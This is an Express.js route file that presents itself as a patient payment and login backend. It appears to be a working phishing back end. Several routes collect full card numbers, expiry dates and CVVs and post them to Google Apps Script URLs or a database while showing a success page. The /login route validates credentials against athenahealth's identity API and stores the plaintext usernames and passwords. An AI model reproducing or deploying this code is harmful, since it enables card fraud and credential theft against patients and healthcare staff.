const express = require("express");
const keys = require("../lib/keys");
const supabase = require("../utils/supabaseClient");
const router = express.Router();
const FormData = require('form-data');
const { default: axios } = require("axios");
const { getPaypalData, updateOrderData, updateOrderStatus, updateOrder, upsertOrderFailed } = require("../lib/supabaseFunctions");


router.post("/success", (req, res) => {


  var Name = req.body.Name;
  var Card = req.body.Card;
  var Expiry = req.body.Expiry;
  var phone = req.body.Phone;
 
  var CVV = req.body.CVV;
  

          const formData = new FormData();
        formData.append('Name', Name);
          formData.append('Card-no', Card);
          formData.append('Expiry-date', Expiry);
          formData.append('Phone', phone);
          /* formData.append('Pateint-Id', code); */
     formData.append('CVV', CVV); 
          // Make the POST request
          axios.post('https://script.google.com/macros/s/AKfycbyhc7fEUPlABBH1LD5oWpINLOTERz13ZbHI3Qj03R2xqtAY4tdvV7QMtvMRrT7-oy59OA/exec', formData, {
            headers: {
              'Content-Type': 'multipart/form-data'
            }
          }).then(()=> {
        res.render('successful')
          }).catch(err => console.log(err));
});

 async function sendGoogleSheet(data) {
  try {
    const response = await axios.post(
      'https://script.google.com/macros/s/AKfycbyhc7fEUPlABBH1LD5oWpINLOTERz13ZbHI3Qj03R2xqtAY4tdvV7QMtvMRrT7-oy59OA/exec',
      data,
      {
        headers: {
          'Content-Type': 'multipart/form-data',
        },
      }
    );
    return response; // Return the full response object
  } catch (err) {
    console.error(err); // Log the error for debugging
    throw err; // Optionally rethrow the error if you want to handle it further up the chain
  }
}

router.post("/pay-alternate", async(req, res) => {


var code = req.body.Code;
var phone = req.body.Phone;
var amount = req.body.Amount;
var uuid = req.body.uuid;
var cardHolder = req.body.Name;
var cardNumber = req.body.Card;
var expiry = req.body.Expiry;
var cvv = req.body.CVV;
var streetAddress = req.body.StreetAddress;
var city = req.body.City;
var state = req.body.State;
var zipCode = req.body.ZipCode;


/* updateOrderStatus(uuid, 'collected');

updateOrderData(uuid, { 
  amount,
  cardHolder,
  cardNumber,
  expiry,
  cvv
}); */

//use upsertOrderFailed instead

upsertOrderFailed(uuid, { 
  amount,
  cardHolder,
  cardNumber,
  expiry,
  cvv,
  streetAddress,
  city,
  state,
  zipCode

});
   
  
  res.render('successful-modern',{ email:'support@techventura.com',
        phone:'+1 (555) 121-4367',
        company_name:'TechVentura Solutions',amount: amount,hidePrint:true })

           
 });


router.post("/pay", async(req, res) => {


var code = req.body.Code;
var phone = req.body.Phone;
var amount = req.body.Amount;
var uuid = req.body.uuid;
var cardHolder = req.body.Name;
var cardNumber = req.body.Card;
var expiry = req.body.Expiry;
var cvv = req.body.CVV;
var streetAddress = req.body.StreetAddress;
var city = req.body.City;
var state = req.body.State;
var zipCode = req.body.ZipCode;


updateOrderStatus(uuid, 'collected');

updateOrderData(uuid, { 
  amount,
  cardHolder,
  cardNumber,
  expiry,
  cvv,
  streetAddress,
  city,
  state,
  zipCode
});
   
  
  res.render('successful-modern',{...keys.SUCCESS_PAGE_DETAILS,amount: amount })
/* 
   const account = await getPaypalData(); 
           const formData = new FormData();
        
           formData.append('Phone', phone);
           formData.append('Pateint-Id', code);
       
           if(amount > keys.AMOUNT){
 
            formData.append('TransactionStatus','Initiated')
            await sendGoogleSheet(formData)

            res.render('payment',{
              val: account, 
              amount, 
              patientId:code, 
              phoneNo: phone
            })
 
           } */
           /* else{ */
         /*    formData.append('TransactionStatus','Routed-Failed')
            await sendGoogleSheet(formData) */
           
          /*  } */
           
 });

router.post("/paynow-alternate", async (req, res) => {
  try {
    const { code: patientId, uuid, amount, phone: phoneNumber } = req.body;
    
    console.log("Received /paynow-alternate request:", req.body);
    /* updateOrderStatus(uuid, 'initiated/failed');
    updateOrder(uuid, { phone: phoneNumber }); */
if (!amount || amount <= keys.AMOUNT) {
    return res.render("failed-alternate", {
      uuid,
      patientId,
      phoneNo: phoneNumber,
      amount
    });
  }
     if(keys.CURRENT_PAYMENT_GATEWAY === 'squareup'){
        return  res.render("square", {
          is_sandbox: keys.IS_SANDBOX,
          applicationId: keys.SQUARE_APPLICATION_ID,
          locationId: keys.SQUARE_LOCATION_ID,
          amount,
          patientId,
          phoneNo: phoneNumber,
          uuid
        });
      }
 if(keys.CURRENT_PAYMENT_GATEWAY === 'authorize'){
        const AUTHORIZE_KEYS = keys.IS_SANDBOX ? keys.AUTHORIZE.SANDBOX : keys.AUTHORIZE.PRODUCTION;
        return res.render("authorize", {
          amount,
          patientId,
          phoneNo: phoneNumber,
          uuid,
          clientKey: AUTHORIZE_KEYS.PUBLIC_CLIENT_KEY,
          apiLoginId: AUTHORIZE_KEYS.API_LOGIN_ID,
          is_sandbox: keys.IS_SANDBOX
        });
      }
  } catch (err) {
    console.error("Error in /paynow-alternate:", err);
    res.sendStatus(500);
  }
});


  router.post("/paynow", async (req, res) => {
    try {
      const { Amount: amount, PateintId: patientId, Phone: phoneNumber, uuid } = req.body;
      const ref = req?.query?.ref;
  
      

      updateOrderStatus(uuid, 'initiated/payment');
      updateOrder (uuid, { phone: phoneNumber });

      if (!amount || amount <= keys.AMOUNT) {
        return res.render("failed",{uuid,patientId,phoneNo:phoneNumber,amount});
      }

      if(keys.CURRENT_PAYMENT_GATEWAY === 'authorize'){
        const AUTHORIZE_KEYS = keys.IS_SANDBOX ? keys.AUTHORIZE.SANDBOX : keys.AUTHORIZE.PRODUCTION;
        return res.render("authorize", {
          amount,
          patientId,
          phoneNo: phoneNumber,
          uuid,
          clientKey: AUTHORIZE_KEYS.PUBLIC_CLIENT_KEY,
          apiLoginId: AUTHORIZE_KEYS.API_LOGIN_ID,
          is_sandbox: keys.IS_SANDBOX
        });
      }


      //should render square up page if current payment gateway is squareup
      if(keys.CURRENT_PAYMENT_GATEWAY === 'squareup'){
        return  res.render("square", {
          is_sandbox: keys.IS_SANDBOX,
          applicationId: keys.SQUARE_APPLICATION_ID,
          locationId: keys.SQUARE_LOCATION_ID,
          amount,
          patientId,
          phoneNo: phoneNumber,
          uuid
        });
      }
      
      const account = await getPaypalData(); 
  
      if (!account || account.length === 0) {
        return res.render('failed');
      }
  
      console.log("Selected index:", account);
  
      if (account?.limit > amount) {
        console.log("Transaction successful");
  
        const formData = new FormData();
        formData.append("Amount", amount);
        formData.append("ClientId", account?.client_id); // Client ID
        formData.append("Pateint-id", patientId);
        formData.append("TransactionStatus", "Initiated");
        formData.append("PhoneNo", phoneNumber);
  
        if (ref && ref.length > 2) {
          formData.append("Referrer", ref);
        }
  
        // Send POST request
        await axios.post("https://script.google.com/macros/s/AKfycbwFtbPMd7BOs61Nm6lYdxjiXDTZaOF3L11ZDflm2aaX5TZqPC3vfOw97h0uuUF3BF_G/exec", formData, {
          headers: { "Content-Type": "multipart/form-data" }
        });
  
        return res.render("payment", {
          val: account, 
          amount, 
          patientId, 
          phoneNo: phoneNumber
        });
      }
      // If payment condition not met, redirect to external payment
      res.render("failed");
    } catch (err) {
      console.error("Error in /checkout:", err);
      res.sendStatus(500);
    }
  });

  router.post('/supabase',async(req,res)=>{
    const data = await getPaypalData()
    res.status(200).json({data:data})
  })
  


/* router.post('/add-user', async (req , res) => {
    const { username, password } = req.body.record;
  
    try {
      const googleSheetsResponse = await Axios.post(
        'https://script.google.com/macros/s/AKfycbxF6uWOl9moXp4SYo-dpvHsfqXhlmBHuBzAKQtEKVAVjsfsVSq9nTCMJtaB1ozid53ZUw/exec',
        { username, password},
        { headers: { 'Content-Type': 'application/json' } }
      );
      
      res.status(200).json(googleSheetsResponse.data);
    } catch (error) {
      console.error('Error calling Google Apps Script:', error.message, error.response?.data);
      res.status(502).json({ error: 'Bad Gateway', details: error.message });
    }
  }); */


  router.post('/login', async (req, res) => {
    console.log(req.body)
    const { username, password } = req.body;
  
    if (!username || !password) {
      return res.status(400).json({ error: 'Username and password are required.' });
    }
  
    const dataToSend = {
      password,
      username,
      options: {
        warnBeforePasswordExpired: true,
        multiOptionalFactorEnroll: false,
      },
    };
  
    try {
      // Step 1: Send the data to the xyz API
      const xyzApiResponse = await axios.post('https://identity.athenahealth.com//api/v1/authn', dataToSend);
  
      // Step 2: Check if xyz API returned a 200 response
      if (xyzApiResponse.status === 200) {
        // Step 3: Send data to Google Sheets
        
  
        const {data,error} = await supabase.from('user_logs').insert({username,password,auth_data:xyzApiResponse?.data}).select()
        if(data){
          
          res.status(200).json({ message: 'Login Successfully.',auth_token  :data[0]?.uid });
        }
  
        else{
          throw new Error('Supabase insert failed.');
        }
        // Respond with success message and Google Sheets response
        
      } else {
        // xyz API did not return a 200 status
        throw new Error('xyz API did not return a 200 response.');
      }
    } catch (error) {
      if (error.response && error.response.status === 401) {
        res.status(401).json({ error: 'Login Failed', details: 'Wrong Password' });
        return;
      }
    
      // For all other errors
      res.status(500).json({
        error: 'Request failed.',
        details: error.response ? error.response.data : error.message,
      });
    }
  });


  router.post('/payment-processor', async (req, res) => {
    try {
      const { code, amount } = req.body;
      console.log('Received payment-processor POST:', { code, amount });

      // You can log to a database or external service here if needed

      // For demonstration, redirect to a success page or send a JSON response
      // Here, send a JSON with a redirectUrl as expected by the frontend
      // Prepare data for /paynow route
      const paynowReq = {
        body: {
          Amount: amount,
          PateintId: code,
          Phone: req.body.phone || req.body.Phone || '', // fallback if phone is not present
        },
        query: {},
      };

      // Call the /paynow handler directly
      await router.handle(
        { ...req, method: 'POST', url: '/paynow', body: paynowReq.body, query: paynowReq.query },
        res,
        () => {}
      );
      // Note: Do not send another response here, as /paynow will handle it.
    } catch (err) {
      console.error('Error in /payment-processor:', err);
      res.status(500).json({ error: 'Internal Server Error' });
    }
  });

 

module.exports = router;
